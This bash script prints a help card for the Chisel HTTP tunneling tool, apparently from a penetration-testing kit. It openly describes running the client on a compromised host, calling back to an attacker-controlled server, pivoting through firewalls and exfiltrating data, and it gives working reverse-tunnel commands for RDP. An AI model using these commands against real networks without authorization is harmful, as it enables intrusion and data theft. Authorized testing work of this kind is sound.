#!/bin/bash
echo -e "\033[32m╔══════════════════════════════════════╗"
echo -e "║  🔩 Chisel — TCP Tunnel over HTTP  ║"
echo -e "╚══════════════════════════════════════╝\033[0m"
echo
echo -e "\033[33mWhy use it:\033[0m Creates TCP/UDP tunnels over HTTP — bypasses"
echo "  firewalls and proxies that block SSH/VPN. Single binary, no deps."
echo "  Perfect for pivoting out of a restricted network: run the client on"
echo "  a compromised host inside the target network, connect back to your"
echo "  chisel server, and now you have a tunnel to reach internal services."
echo "  Exfiltrate data or chain into deeper networks."
echo
echo -e "\033[33mServer (DragonPi):\033[0m"
echo "  chisel server -p 8000 --reverse"
echo
echo -e "\033[33mClient (target):\033[0m"
echo "  chisel client dragonpi.local:8000 R:3389:127.0.0.1:3389"
echo
echo -e "\033[33mPort forwarding:\033[0m"
echo "  # Server: chisel server -p 8000 --reverse"
echo "  # Client: chisel client SERVER:8000 R:LPORT:TARGET:RPORT"
echo
echo -e "\033[33mExample - tunnel RDP:\033[0m"
echo "  # On DragonPi: chisel server -p 8000 --reverse"
echo "  # On target:   chisel client dragonpi.local:8000 R:33389:127.0.0.1:3389"
echo "  # Connect:     rdesktop localhost:33389"
echo -e "\033[90m──────────────────────────────────────\033[0m"
